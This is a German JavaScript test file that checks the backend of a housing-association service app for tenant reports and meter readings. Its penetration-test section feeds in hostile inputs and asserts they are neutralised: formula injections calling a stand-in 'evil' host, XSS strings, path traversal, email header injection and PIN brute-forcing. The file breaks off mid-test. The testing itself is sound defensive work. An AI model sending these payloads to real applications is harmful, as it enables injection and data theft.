// Automatisch erzeugt aus den Entwicklungs-Tests. Start: node tests/backend-security.test.js
// Prüft backend/Code.gs mit nachgebildeten Google-Diensten (kein Google-Konto nötig).
const fs = require('fs'), vm = require('vm');
process.env.TZ = 'Europe/Berlin';
let calName = 'WEG Wartenberger Dorfkrug'; const alerts = []; const cache = {}; const triggers = [];
const events = {}; let evSeq = 0;
const mkEv = (title, start, end, opt) => { const id = 'ev' + (++evSeq); const e = { id, title, start, end, desc: (opt || {}).description || '', getId: () => id, setTitle(t) { e.title = t; }, setAllDayDates(a, b) { e.start = a; e.end = b; }, setDescription(d) { e.desc = d; }, getDescription: () => e.desc, deleteEvent() { delete events[id]; } }; events[id] = e; return e; };
const cal = { getName: () => 'WEG Wartenberger Dorfkrug', getEventById: (id) => events[id] || null, createAllDayEvent: mkEv, getEvents: () => Object.values(events) }; const sheets = {}, props = {}, mails = [], files = [];
function mkSheet(name) {
  const sh = { name, grid: [], filter: null, bgs: {}, getName: () => name,
    ensure(r) { while (sh.grid.length < r) sh.grid.push([]); },
    getRange(r, c, nr = 1, nc = 1) { if (typeof r === 'string') return {}; const api = {
      setValues(v) { sh.ensure(r + nr - 1); v.forEach((row, i) => row.forEach((x, j) => { sh.grid[r - 1 + i][c - 1 + j] = x; })); return api; },
      getValues() { const out = []; for (let i = 0; i < nr; i++) { const row = sh.grid[r - 1 + i] || []; out.push(Array.from({ length: nc }, (_, j) => row[c - 1 + j] === undefined ? '' : row[c - 1 + j])); } return out; },
      setValue(x) { sh.ensure(r); sh.grid[r - 1][c - 1] = x; return api; },
      setBackgrounds(b) { sh.bgs = b; return api; }, setRichTextValues(v) { sh.ensure(r + nr - 1); v.forEach((row, i) => { sh.grid[r - 1 + i][c - 1] = row[0]; }); return api; }, setFontWeight() { return api; }, setBackground() { return api; }, setFontColor() { return api; },
      setNumberFormat() { return api; }, setDataValidation() { return api; },
      createFilter() { sh.filter = { remove() { sh.filter = null; } }; return sh.filter; } }; return api; },
    getDataRange() { return { getValues: () => sh.grid.map((r) => r.slice()) }; },
    getLastRow() { return sh.grid.length; }, getMaxRows() { return 1000; }, setFrozenRows() {},
    appendRow(row) { sh.grid.push(row); }, clear() { sh.grid = []; }, getFilter() { return sh.filter; }, autoResizeColumns() {} };
  return (sheets[name] = sh);
}
const ss = { getSheetByName: (n) => sheets[n] || null, insertSheet: mkSheet, getSheets: () => Object.values(sheets), deleteSheet() {}, getUrl: () => 'https://sheet' };
const ctx = { console, JSON, Math, Date, Object, String, Number, Error, Array, encodeURIComponent,
  Logger: { log() {} },
  SpreadsheetApp: { getActive: () => ({ toast() {} }), getActiveSpreadsheet: () => ss, newRichTextValue: () => { const o = { text: '', url: null, setText(t) { o.text = t; return o; }, setLinkUrl(u) { o.url = u; return o; }, build() { return { rich: true, text: o.text, url: o.url }; } }; return o; }, newDataValidation: () => ({ requireValueInList() { return this; }, requireCheckbox() { return this; }, requireValueInRange() { return this; }, setAllowInvalid() { return this; }, build() { return {}; } }), getUi: () => ({ alert: (t, m) => { alerts.push(t + ': ' + m); }, ButtonSet: { OK: 1 }, createMenu: () => ({ addItem() { return this; }, addSeparator() { return this; }, addToUi() {} }) }) },
  PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] || null, setProperty: (k, v) => { props[k] = v; } }) },
  DriveApp: { createFolder: () => ({ getId: () => 'F1' }), getFolderById: () => ({ createFile: (b) => { files.push(b.name); return { getUrl: () => 'https://drive.google.com/file/d/' + b.name }; } }) },
  Utilities: { base64Decode: (s) => Buffer.from(s, 'base64'), newBlob: (bytes, mime, name) => ({ name }), getUuid: () => Math.random().toString(16).slice(2, 10) + '-' + Math.random().toString(16).slice(2, 10),
    formatDate: (d, tz, f) => { const p = (n) => String(n).padStart(2, '0'); return f === 'yyMMdd' ? String(d.getFullYear()).slice(2) + p(d.getMonth() + 1) + p(d.getDate()) : `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}`; } },
  CacheService: { getScriptCache: () => ({ get: (k) => cache[k] || null, put: (k, v) => { cache[k] = v; }, remove: (k) => { delete cache[k]; }, removeAll: (ks) => ks.forEach((k) => delete cache[k]) }) },
  LockService: { getScriptLock: () => ({ waitLock() {}, tryLock() { return true; }, releaseLock() {} }) },
  MailApp: { sendEmail: (m) => mails.push(m), getRemainingDailyQuota: () => 1500 },
  ScriptApp: { getService: () => ({ getUrl: () => 'https://x/exec' }), getProjectTriggers: () => triggers, newTrigger: (fn) => { const b = { timeBased: () => b, everyDays: () => b, atHour: () => b, inTimezone: () => b, create: () => { triggers.push({ getHandlerFunction: () => fn }); } }; return b; } },
  CalendarApp: { getAllCalendars: () => [cal, { getName: () => 'Privat' }], getCalendarById: (id) => (id === 'good' ? cal : null), getCalendarsByName: (n) => (n === calName ? [cal] : []) },
  HtmlService: { createHtmlOutput: (h) => ({ html: h, setTitle() { return this; }, addMetaTag() { return this; } }) },
  ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (t) => ({ setMimeType: () => JSON.parse(t) }) },
};
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(require('path').join(__dirname, '..', 'backend', 'Code.gs'), 'utf8'), ctx);
const post = (p) => ctx.doPost({ postData: { contents: JSON.stringify(p) } });
let fails = 0; let quiet = true; const check = (label, cond, extra) => { if (!quiet || !cond) console.log((cond ? 'OK  ' : 'FAIL') + ' ' + label + (extra !== undefined ? ' → ' + JSON.stringify(extra) : '')); if (!cond) fails++; };
const photo = { name: 'x.jpg', mimeType: 'image/jpeg', data: Buffer.from('img').toString('base64') };
const base = { house: 'Haus 3', entrance: 'Lindenberger Str. 6', object: 'lind6', website: '', pin: '13059' };

ctx.setup();
check('setup: 5 Blätter', ['Tickets', 'Zählerstände', 'Reinigung', 'Übersicht Zähler', 'Aktuelles'].every((n) => sheets[n]), Object.keys(sheets));
props.NOTIFY_EMAIL = 'service@willbrandt-kompagnon.de';

let r = post({ ...base, action: 'submitMeterReadings', wohnung: 'Whg 04', name: 'Müller', ablesedatum: '2026-09-20', meters: [
  { raum: 'Bad', art: 'Kalt', zaehlernummer: 'A1', zaehlerstand: '12,5', photo },
  { raum: 'Bad', art: 'Warm', zaehlernummer: 'A2', zaehlerstand: '8.125', photo },
  { raum: 'Küche', art: 'Kalt', zaehlernummer: 'A3', zaehlerstand: '3', photo }] });
check('3 Zähler in einer Meldung', r.ok && r.count === 3 && sheets['Zählerstände'].grid.length === 4, r);
const zr = sheets['Zählerstände'].grid[1];
check('Zeile: Erfassungs-ID + Ablesedatum', /^E-/.test(zr[13]) && zr[14] instanceof Date && zr[14].getDate() === 20 && zr[9] === 12.5, zr.slice(9));
post({ ...base, action: 'submitMeterReadings', wohnung: 'Whg 01', name: 'Schmidt', ablesedatum: '2026-09-21', meters: [{ raum: 'Bad', art: 'Kalt', zaehlernummer: 'B1', zaehlerstand: '5', photo }] });
post({ ...base, action: 'submitMeterReadings', wohnung: 'Whg 04', name: 'Müller', ablesedatum: '2027-03-01', meters: [{ raum: 'Bad', art: 'Kalt', zaehlernummer: 'A1', zaehlerstand: '20', photo }] });
const ov = sheets['Übersicht Zähler'].grid;
check('Übersicht sortiert (Whg 01 vor Whg 04, neueste Ablesung zuerst)', ov[1][2] === 'Whg 01' && ov[2][2] === 'Whg 04' && ov[2][3].getFullYear() === 2027, ov.slice(1).map((x) => x[2] + ' ' + x[3].toISOString().slice(0, 10) + ' ' + x[4] + ' ' + x[5]));
check('Foto als echter Link', ov[1][9].rich && ov[1][9].text === 'Foto öffnen' && /^https:\/\/drive\.google\.com\//.test(ov[1][9].url), ov[1][9]);
check('Pakete farbig abwechselnd', sheets['Übersicht Zähler'].bgs[0][0] !== sheets['Übersicht Zähler'].bgs[1][0] && sheets['Übersicht Zähler'].bgs[1][0] === sheets['Übersicht Zähler'].bgs[2][0]);
check('Filter gesetzt', !!sheets['Übersicht Zähler'].filter);
check('Zähler ohne Foto abgelehnt', post({ ...base, action: 'submitMeterReadings', wohnung: '1', ablesedatum: '2026-09-20', meters: [{ raum: 'Bad', art: 'Kalt', zaehlernummer: 'X', zaehlerstand: '1' }] }).error === 'Zähler 1: bitte ein Foto anhängen');
check('Zu viele Zähler abgelehnt', !post({ ...base, action: 'submitMeterReadings', wohnung: '1', meters: new Array(9).fill({ raum: 'Bad', art: 'Kalt', zaehlernummer: 'X', zaehlerstand: '1', photo }) }).ok);
check('Alte App (Einzelzähler) funktioniert weiter', post({ ...base, action: 'submitMeterReading', wohnung: 'Whg 09', raum: 'Bad', art: 'Warm', zaehlernummer: 'C1', zaehlerstand: '1', photo }).ok);

mails.length = 0;
r = post({ ...base, action: 'submitTicket', type: 'Klingelschild', wohnung: '04', name: 'Müller', details: 'Müller / Schmidt', kontakt: '0170 123' });
check('Klingelschild ok', r.ok, r);
const hm = mails.find((m) => m.to === 'info@gs-schreier.de');
check('Mail an GS Schreier', !!hm, mails.map((m) => m.to));

const t = sheets['Tickets'].grid.find((x) => x[0] === r.id);
const code = t[16];
check('Erledigt-Code gespeichert, Link in Mail', code && hm.body.includes(`action=done&id=${r.id}&t=${code}`));
let page = ctx.doGet({ parameter: { action: 'done', id: r.id, t: 'falsch' } });
check('Falscher Code → ungültig', page.html.includes('Link ungültig'));
page = ctx.doGet({ parameter: { action: 'done', id: r.id, t: code } });
check('Erst Bestätigungsseite, Status bleibt offen', page.html.includes('Ja, als erledigt melden') && t[3] === 'offen');
page = ctx.doGet({ parameter: { action: 'done', id: r.id, t: code, confirm: '1' } });
const t2 = sheets['Tickets'].grid.find((x) => x[0] === r.id);
check('Nach Bestätigung: erledigt + Datum', t2[3] === 'erledigt' && t2[14] instanceof Date && page.html.includes('Vielen Dank'));
page = ctx.doGet({ parameter: { action: 'done', id: r.id, t: code, confirm: '1' } });
check('Zweiter Klick → bereits erledigt', page.html.includes('Bereits erledigt'));
check('Mangel sendet keine Hausmeister-Mail', (() => { mails.length = 0; post({ ...base, action: 'submitTicket', type: 'Mangel', details: 'Licht kaputt', ort: 'Keller' }); return !mails.some((m) => m.to === 'info@gs-schreier.de'); })());
check('XSS in Mail-HTML entschärft', (() => { mails.length = 0; post({ ...base, action: 'submitTicket', type: 'Klingelschild', wohnung: '1', name: '<b>x</b>', details: '<script>' }); return !mails[0].htmlBody.includes('<script>'); })());
// ---------- Sicherheit ----------
check('POST ohne PIN abgelehnt (code pin)', (() => { const x = post({ ...base, pin: '', action: 'submitTicket', type: 'Mangel', details: 'x' }); return !x.ok && x.code === 'pin'; })());
check('POST falsche PIN abgelehnt', post({ ...base, pin: '12345', action: 'submitTicket', type: 'Mangel', details: 'x' }).code === 'pin');
check('GET status ohne PIN abgelehnt', ctx.doGet({ parameter: { action: 'status', ids: 'T-260923-ABCD' } }).code === 'pin');
check('GET status mit PIN ok', ctx.doGet({ parameter: { action: 'status', pin: '13059', ids: 'T-260923-ABCD', pin: '13059' } }).ok);
check('GET news mit PIN ok', ctx.doGet({ parameter: { action: 'news', pin: '13059', obj: 'lind6', pin: '13059' } }).ok);
check('Erledigt-Link braucht keine PIN', ctx.doGet({ parameter: { action: 'done', id: 'T-x', t: 'y' } }).html.includes('Link ungültig'));
props.APP_PIN = '55555';
check('APP_PIN-Eigenschaft hat Vorrang', post({ ...base, action: 'submitTicket', type: 'Mangel', details: 'x' }).code === 'pin' && post({ ...base, pin: '55555', action: 'submitTicket', type: 'Mangel', details: 'x' }).ok);
delete props.APP_PIN;
for (let i = 0; i < 310; i++) post({ ...base, pin: String(10000 + i), action: 'submitTicket', type: 'Mangel', details: 'x' });
check('Nach vielen Fehlversuchen gesperrt – auch richtige PIN', post({ ...base, action: 'submitTicket', type: 'Mangel', details: 'x' }).code === 'pin_locked');
Object.keys(cache).forEach((k) => delete cache[k]);
check('Formel im Namen bleibt Text (Zählerstände + Übersicht)', (() => {
  post({ ...base, action: 'submitMeterReadings', wohnung: '=1+1', name: '=HYPERLINK("http://evil")', ablesedatum: '2026-09-20', meters: [{ raum: 'Bad', art: 'Kalt', zaehlernummer: '@x', zaehlerstand: '1', photo }] });
  const bad = sheets['Übersicht Zähler'].grid.flat().filter((v) => typeof v === 'string' && /^[=+\-@]/.test(v));
  return bad.length === 0;
})());
Object.keys(cache).forEach((k) => delete cache[k]);
let limited = false;
for (let i = 0; i < 45; i++) { const x = post({ ...base, action: 'submitTicket', type: 'Mangel', details: 'x' }); if (!x.ok && /sehr viele/.test(x.error)) limited = true; }
check('Meldungen pro Stunde begrenzt', limited);
Object.keys(cache).forEach((k) => delete cache[k]);
mails.length = 0;
for (let i = 0; i < 12; i++) post({ ...base, action: 'submitTicket', type: 'Klingelschild', wohnung: '1', name: 'A', details: 'B' });
check('Hausmeister-Mails begrenzt (10 je 6 Std.), Tickets trotzdem gespeichert', mails.filter((m) => m.to === 'info@gs-schreier.de').length === 10);
check('Übergroße Anfrage abgelehnt', ctx.doPost({ postData: { contents: 'x'.repeat(26 * 1024 * 1024) } }).error === 'Anfrage zu groß');

console.log(fails ? `${fails} FEHLER` : 'Alle Backend-Tests bestanden');
mails.length = 0;
post({ ...base, action: 'submitMeterReadings', wohnung: 'Whg 07', name: 'Test', ablesedatum: '2026-09-23', meters: [{ raum: 'Küche', art: 'Warm', zaehlernummer: 'K9', zaehlerstand: '4,25', photo }] });
const zm = mails.find((m) => /Zählerstände/.test(m.subject));
check('Wasserzähler → Mail an Verwaltung', !!zm && zm.to === 'service@willbrandt-kompagnon.de', zm && zm.subject);

mails.length = 0; ctx.testMail();
check('testMail verschickt', mails.length === 1 && mails[0].subject.includes('Testmail'));
// Status
const tid = sheets['Tickets'].grid[1][0];
const eid = sheets['Zählerstände'].grid[1][13];
let st = ctx.doGet({ parameter: { action: 'status', pin: '13059', ids: `${tid},${eid},T-000000-XXXX,<script>` } });
check('Status: Ticket, Zähler, unbekannt, ungültig verworfen', st.ok && st.items.length === 3 && st.items[0].status && st.items[1].kind === 'meter' && st.items[1].count === 3 && st.items[2].status === 'unbekannt', st.items);
check('Status ohne persönliche Daten', !JSON.stringify(st).match(/Müller|Whg|Lindenberger/));
// News
const ng = sheets['Aktuelles'].grid;
check('Aktuelles: Beispielzeile inaktiv', ng.length === 2 && ng[1][0] === false);
const d = (off) => { const x = new Date(); x.setDate(x.getDate() + off); return x; };
ng.push([true, d(-1), d(2), 'Wasser abgestellt', 'Mi 9–12 Uhr', true, '']);
ng.push([true, d(-5), d(-1), 'Abgelaufen', 'x', false, '']);
ng.push([true, d(3), '', 'Zukunft', 'x', false, '']);
ng.push([true, '', '', 'Nur Dorfstr', 'x', false, 'dorf27']);
ng.push([true, d(-2), '', 'Allgemein', 'Hallo', false, '']);
let nw = ctx.doGet({ parameter: { action: 'news', pin: '13059', obj: 'lind6' } });
check('Aktuelles lind6: nur gültige, wichtig zuerst', nw.items.map((i) => i.title).join('|') === 'Wasser abgestellt|Allgemein', nw.items.map((i) => i.title));
nw = ctx.doGet({ parameter: { action: 'news', pin: '13059', obj: 'dorf27' } });
check('Aktuelles dorf27: inkl. aufgangsspezifisch', nw.items.map((i) => i.title).includes('Nur Dorfstr'), nw.items.map((i) => i.title));
// ---------- Heizungszähler ----------
Object.keys(cache).forEach((k) => delete cache[k]);
mails.length = 0;
let hz = post({ ...base, action: 'submitMeterReadings', wohnung: 'Whg 12', name: 'Kaya', ablesedatum: '2026-09-20', meters: [
  { raum: 'Flur', art: 'Heizung', einheit: 'MWh', zaehlernummer: 'H1', zaehlerstand: '4,321', photo },
  { raum: 'Bad', art: 'Kalt', einheit: 'kWh', zaehlernummer: 'W1', zaehlerstand: '5', photo }] });
const zs = sheets['Zählerstände'].grid;
const hrow = zs.find((r) => r[8] === 'H1'), wrow = zs.find((r) => r[8] === 'W1');
check('Heizung gespeichert mit MWh', hz.ok && hrow[7] === 'Heizung' && hrow[15] === 'MWh' && hrow[9] === 4.321, hrow && hrow.slice(7));
check('Wasser: falsche Einheit → m³', wrow[15] === 'm³', wrow[15]);
check('Heizung ohne Einheit → kWh', (() => { post({ ...base, action: 'submitMeterReadings', wohnung: 'Whg 13', meters: [{ raum: 'Flur', art: 'Heizung', zaehlernummer: 'H2', zaehlerstand: '1', photo }] }); return zs.find((r) => r[8] === 'H2')[15] === 'kWh'; })());
check('Mail nennt Einheiten', mails.some((m) => /Zähler H1 – Stand 4,321 MWh/.test(m.body) && /Stand 5 m³/.test(m.body)), mails.map((m) => m.body).join('\n'));
const ovh = sheets['Übersicht Zähler'].grid;
const oh = ovh[0];
const hov = ovh.find((r) => r[oh.indexOf('Zählernummer')] === 'H1');
check('Übersicht: Einheit-Spalte', oh.indexOf('Einheit') === 8 && hov[8] === 'MWh', oh);
check('Unbekannte Art abgelehnt', !post({ ...base, action: 'submitMeterReadings', wohnung: '1', meters: [{ raum: 'Bad', art: 'Gas', zaehlernummer: 'X', zaehlerstand: '1', photo }] }).ok);


quiet = false; fails = 0;
console.log('================ PEN-TEST BACKEND ================');
ctx.setup();
const stf = sheets['Mitarbeiter'].grid;
const ADM = stf[1][3], ADM2 = stf[2][3], LEAD = stf[3][3], HM = stf[4][3], SPARE = stf[5][3];
stf[4][2] = true; delete cache.staff;           // Nr. 100 vergeben, 101 bleibt Vorrat
const reset = () => Object.keys(cache).forEach((k) => delete cache[k]);
const P = (x) => post(x); const G = (q) => ctx.doGet({ parameter: q });
const photo2 = photo;

console.log('--- A. Zugriff / Authentifizierung');
check('A0 Cockpit nicht für Hausmeister/ohne Token', ['adminOverview', 'adminUpdateTask'].every((action) =>
  P({ action, token: HM, id: 'x', status: 'erledigt' }).code === 'staff' && !P({ action, pin: '13059', id: 'x' }).ok));
{
  const lo = P({ action: 'adminOverview', token: LEAD });
  check('A0 Leitung (001): nur Hausmeister-Aufträge, keine Zähler/Fehler/Looker', lo.ok && lo.role === 'Leitung' && lo.tasks.every((t) => t.owner === 'Hausmeister')
    && lo.kpi.errors24 === null && lo.lookerUrl === '' && lo.months.every((m) => m['Zähler'] === 0) && Array.isArray(lo.team.members), lo.tasks.map((t) => t.owner));
  check('A0 Leitung darf Zuständigkeit/Notiz nicht ändern', !P({ action: 'adminUpdateTask', token: LEAD, id: 'x', owner: 'Verwaltung' }).ok);
}
check('A0 Cockpit für 007 und 008', P({ action: 'adminOverview', token: ADM }).ok && P({ action: 'adminOverview', token: ADM2 }).ok);
check('A1 Portal ohne Token', P({ action: 'getTasks' }).code === 'staff');
check('A2 Portal leerer/kaputter Token', ['', ' ', 'x', 'a'.repeat(23), 'g'.repeat(40), HM + 'ff', HM.toUpperCase().replace(/./g, 'z')].every((t) => !P({ action: 'getTasks', token: t }).ok));
check('A3 Portal mit Vorrats-Token (gesperrt)', P({ action: 'getTasks', token: SPARE }).code === 'staff');
check('A4 Prototyp-Namen als Aktion', ['constructor', '__proto__', 'toString', 'hasOwnProperty', 'valueOf'].every((a) => { const r = P({ action: a, token: HM, pin: '13059' }); return r.ok === false && r.error === 'Unbekannte Aktion'; }));
check('A5 Prototyp-Namen als Token', ['__proto__', 'constructor', 'toString'].every((t) => P({ action: 'hmLogin', token: t }).code === 'staff'));
check('A6 Bewohner-Aktion ohne PIN', P({ ...base, pin: '', action: 'submitTicket', type: 'Mangel', details: 'x' }).code === 'pin');
check('A7 Bewohner-Aktion mit falschem Token statt PIN', P({ ...base, pin: '', token: 'f'.repeat(40), action: 'submitTicket', type: 'Mangel', details: 'x' }).code === 'pin');
check('A8 Status/News ohne PIN', G({ action: 'status', ids: 'T-260924-ABCD' }).code === 'pin' && G({ action: 'news', obj: 'lind6' }).code === 'pin');
check('A9 getTasks per GET ohne/mit falschem Token', G({ action: 'getTasks' }).ok === false && G({ action: 'getTasks', token: 'a'.repeat(40) }).ok === false);
check('A10 PIN mit Leerzeichen/Typ-Tricks', [' 13059 ', 13059, ['13059'], { toString: () => '13059' }].map((pin) => P({ ...base, pin, action: 'submitTicket', type: 'Mangel', details: 'x' }).ok).join() === 'true,true,true,false');

console.log('--- B. Rechte / Datenabfluss');
reset();
P({ ...base, action: 'submitTicket', type: 'Elektroraum', wohnung: '9', name: 'Geheim Name', telefon: '0170 999', details: 'x', date: '2030-01-07' });
const hmTasks = P({ action: 'getTasks', token: HM }).tasks;
check('B1 Hausmeister sieht keine Verwaltungs-Aufträge (Name/Telefon)', !JSON.stringify(hmTasks).includes('Geheim Name') && !JSON.stringify(hmTasks).includes('0170 999'));
const el = P({ action: 'getTasks', token: ADM }).tasks.find((t) => t.name === 'Geheim Name');
check('B2 Hausmeister kann fremden Auftrag nicht erledigen', el && !P({ action: 'completeTask', token: HM, id: el.id }).ok);
check('B3 Auftrags-ID-Tricks', ['', 'M-', 'T-*', '__proto__', el.id + ' ', el.id.toLowerCase()].every((id) => !P({ action: 'completeTask', token: HM, id }).ok));
check('B4 Status verrät keine Personendaten', !JSON.stringify(G({ action: 'status', ids: el.id, pin: '13059' })).includes('Geheim'));
check('B5 Status nur gültige IDs, max 20', G({ action: 'status', ids: Array(50).fill(el.id).join(',') + ',<script>,../', pin: '13059' }).items.length === 20);
check('B6 Login liefert keine Tokens/Links', !JSON.stringify(P({ action: 'hmLogin', token: HM })).match(/[a-f0-9]{40}|hm=/));
check('B7 News liefert keine Namen der Mitarbeiter', !JSON.stringify(G({ action: 'news', obj: 'lind6', pin: '13059' })).includes('Nr. '));

console.log('--- C. Formel-Injection in die Tabelle');
reset();
const evil = ['=IMPORTXML("http://evil","//a")', '+1+1', '-2+3', '@SUM(1)', '\t=1', '\r=1', ' =HYPERLINK("x")', '=1'];
evil.forEach((e) => {
  P({ ...base, action: 'submitTicket', type: 'Mangel', wohnung: e, name: e, details: e, ort: e, kontakt: e });
  P({ ...base, action: 'submitMeterReadings', wohnung: e, name: e, meters: [{ raum: e, art: 'Kalt', zaehlernummer: e, zaehlerstand: '1', photo }] });
  P({ action: 'submitStaffDefect', token: HM, ort: e, beschreibung: e, photo: null });
  P({ action: 'logCleaning', token: HM, areaToken: 'TG', activity: 'Reinigung', note: e });
});
const bad = [];
['Tickets', 'Zählerstände', 'Übersicht Zähler', 'Mängel Hausmeister', 'Reinigung'].forEach((n) => sheets[n].grid.slice(1).forEach((row, i) => row.forEach((v, j) => {
  if (typeof v === 'string' && /^\s*[=+\-@\t\r]/.test(v)) bad.push(`${n} Z${i + 2} S${j + 1}: ${JSON.stringify(v)}`);
})));
check('C1 Keine ausführbare Formel in irgendeinem Blatt', bad.length === 0, bad.slice(0, 5));

console.log('--- D. Uploads');
reset();
const up = (mime, data) => P({ ...base, action: 'submitTicket', type: 'Mangel', details: 'x', photo: { mimeType: mime, data } });
check('D1 SVG/HTML/JS als Bild abgelehnt', ['image/svg+xml', 'text/html', 'application/javascript', 'image/jpeg; charset=x', ''].every((m) => !up(m, Buffer.from('<svg onload=alert(1)>').toString('base64')).ok));
check('D2 Foto > 6 MB abgelehnt', !up('image/jpeg', Buffer.alloc(6.5 * 1024 * 1024).toString('base64')).ok);
check('D3 Anfrage > 25 MB abgelehnt', ctx.doPost({ postData: { contents: 'x'.repeat(26 * 1024 * 1024) } }).error === 'Anfrage zu groß');
check('D4 Dateiname ohne Pfad-Tricks', (() => { files.length = 0; P({ ...base, action: 'submitMeterReadings', wohnung: '../../x', meters: [{ raum: '../etc', art: 'Kalt', zaehlernummer: 'Q', zaehlerstand: '1', photo }] }); return files.every((f) => !/[\/\\]/.test(f)); })(), files);
check('D5 Kaputtes JSON → Fehler statt Absturz', ctx.doPost({ postData: { contents: '{"action":' } }).ok === false && ctx.doPost({}).ok === false && ctx.doPost(undefined).ok === false);

console.log('--- E. Manipulation Nachweise');
reset();
P({ action: 'logCleaning', token: HM, areaToken: 'TG', activity: 'Frei erfundene Tätigkeit <b>', timestamp: new Date().toISOString() });
let last = sheets['Reinigung'].grid[sheets['Reinigung'].grid.length - 1];
check('E1 Tätigkeit nur aus der Liste', last[5] !== 'Frei erfundene Tätigkeit <b>', last[5]);
P({ action: 'logCleaning', token: HM, areaToken: 'TG', activity: 'Reinigung', timestamp: new Date(Date.now() - 3 * 86400000).toISOString() });
last = sheets['Reinigung'].grid[sheets['Reinigung'].grid.length - 1];
check('E2 Rückdatierter Nachweis ist gekennzeichnet', /nachgesendet/.test(last[9]), last[9]);
P({ action: 'logCleaning', token: HM, areaToken: 'TG', activity: 'Reinigung', timestamp: '2099-01-01T00:00:00Z' });
last = sheets['Reinigung'].grid[sheets['Reinigung'].grid.length - 1];
check('E3 Zukunfts-Zeit → Serverzeit', Math.abs(last[0] - Date.now()) < 5000);
check('E4 Mitarbeiter-Nr kommt vom Server, nicht aus der Anfrage', (() => { P({ action: 'logCleaning', token: HM, areaToken: 'TG', activity: 'Reinigung', user: '007', nr: '007' }); return sheets['Reinigung'].grid[sheets['Reinigung'].grid.length - 1][2] === '100'; })());

console.log('--- F. Überlastung / Missbrauch');
reset(); mails.length = 0;
let blockedAt = 0;
for (let i = 1; i <= 60; i++) { const r = P({ ...base, action: 'submitTicket', type: 'Klingelschild', wohnung: '1', name: 'X', details: 'spam' }); if (!r.ok) { blockedAt = i; break; } }
check('F1 Meldungen je Stunde begrenzt', blockedAt > 0 && blockedAt <= 41, blockedAt);
check('F2 Hausmeister-Mails begrenzt (10)', mails.filter((m) => m.to === 'info@gs-schreier.de').length === 10);
reset(); let pinBlock = 0;
for (let i = 1; i <= 320; i++) { if (P({ ...base, pin: '0000' + i, action: 'submitTicket', type: 'Mangel', details: 'x' }).code === 'pin_locked') { pinBlock = i; break; } }
check('F3 PIN-Durchprobieren gebremst', pinBlock > 290, pinBlock);
check('F4 Hausmeister trotz PIN-Sperre arbeitsfähig', P({ action: 'logCleaning', token: HM, areaToken: 'TG', activity: 'Reinigung' }).ok);
reset();
check('F5 Mail-Kontingent bleibt für Hausmeister-Aufträge reserviert', (() => { ctx.MailApp.getRemainingDailyQuota = () => 10; mails.length = 0; P({ ...base, action: 'submitTicket', type: 'Mangel', details: 'x' }); const skipped = mails.length === 0; mails.length = 0; P({ ...base, action: 'submitTicket', type: 'Klingelschild', wohnung: '1', name: 'X', details: 'y' }); const hmOk = mails.some((m) => m.to === 'info@gs-schreier.de'); ctx.MailApp.getRemainingDailyQuota = () => 1500; return skipped && hmOk; })());

console.log('--- G. Erledigt-Link (E-Mail des Hausmeisters)');
reset();
const kt = P({ ...base, action: 'submitTicket', type: 'Klingelschild', wohnung: '<img src=x onerror=alert(1)>', name: '"><script>alert(1)</script>', details: 'x' });
const krow = sheets['Tickets'].grid.find((r) => r[0] === kt.id);
let pg = G({ action: 'done', id: kt.id, t: krow[16] });
check('G1 Bestätigungsseite: Eingaben escaped', !/<script>alert|<img src=x/.test(pg.html), pg.html.slice(0, 200));
pg = G({ action: 'done', id: '<script>alert(1)</script>', t: '"><svg onload=alert(1)>' });
check('G2 Ungültiger Link: nichts gespiegelt', !/<script>|<svg/.test(pg.html));
check('G3 Falscher/leerer Code', !/Vielen Dank/.test(G({ action: 'done', id: kt.id, t: '' }).html) && !/Vielen Dank/.test(G({ action: 'done', id: kt.id }).html));
const hmMail = mails.filter((m) => m.to === 'info@gs-schreier.de').pop();
check('G4 Hausmeister-Mail HTML escaped', hmMail && !/<script>|<img src=x/.test(hmMail.htmlBody));

console.log('--- H. Eingaben mit Zeilenumbrüchen / Steuerzeichen');
reset(); mails.length = 0;
P({ ...base, entrance: 'X\r\nBcc: evil@x.de', action: 'submitTicket', type: 'Klingelschild', wohnung: '1\nBcc: evil@x.de', name: 'N', details: 'y' });
check('H1 Keine Umbrüche in Betreffzeilen', mails.length > 0 && mails.every((m) => !/[\r\n]/.test(m.subject)), mails.map((m) => m.subject));
check('H2 Empfänger nicht beeinflussbar', mails.every((m) => ['info@gs-schreier.de', 'service@willbrandt-kompagnon.de'].includes(m.to)));

console.log('--- I. Cockpit / Leitung / Auswertung / Abfahrten (Pen-Test 2)');
reset();
for (const obj of ['constructor', '__proto__', 'toString', 'hasOwnProperty']) {
  P({ pin: '13059', action: 'submitTicket', type: 'Mangel', details: 'x', entrance: '', object: obj, house: '' });
}
let i1ok = true, i1err = '';
try { ctx.rebuildAnalytics(); } catch (e) { i1ok = false; i1err = e.message; }
check('I1 Manipulierte Aufgang-ID (constructor/__proto__) legt Auswertung nicht lahm', i1ok, i1err);
const ov2 = P({ action: 'adminOverview', token: ADM });
check('I2 Cockpit bleibt nutzbar, Aufgang immer Text', ov2.ok && ov2.tasks.every((t) => typeof t.entrance === 'string'), ov2.error);
check('I3 Leerer Auftrags-ID wird abgelehnt (erledigen/ändern)', !P({ action: 'completeTask', token: HM, id: '' }).ok && !P({ action: 'adminUpdateTask', token: ADM, id: '', status: 'erledigt' }).ok);
check('I4 Leitung: fremde Rolle per Anfrage nicht erschleichbar', (() => { const r = P({ action: 'adminOverview', token: LEAD, role: 'Verwaltung', user: { role: 'Verwaltung' } }); return r.ok && r.role === 'Leitung' && r.tasks.every((t) => t.owner === 'Hausmeister'); })());
check('I5 Hausmeister: Cockpit-Aktionen gesperrt, auch mit role-Feld', P({ action: 'adminOverview', token: HM, role: 'Verwaltung' }).code === 'staff');
check('I6 Notiz-Formel wird Text (adminUpdateTask)', (() => { const t = P({ action: 'adminOverview', token: ADM }).tasks[0]; P({ action: 'adminUpdateTask', token: ADM, id: t.id, note: '=HYPERLINK("http://x")' }); const g = [sheets['Tickets'], sheets['Mängel Hausmeister']].map((s) => s.grid).flat(); return g.some((r) => r[0] === t.id && r.some((c) => typeof c === 'string' && c.startsWith("'=HYPERLINK"))); })());
{
  let locks = 0;
  const orig = ctx.LockService.getScriptLock;
  ctx.LockService.getScriptLock = () => { locks++; return orig(); };
  G({ action: 'departures', pin: '13059' });
  ctx.LockService.getScriptLock = orig;
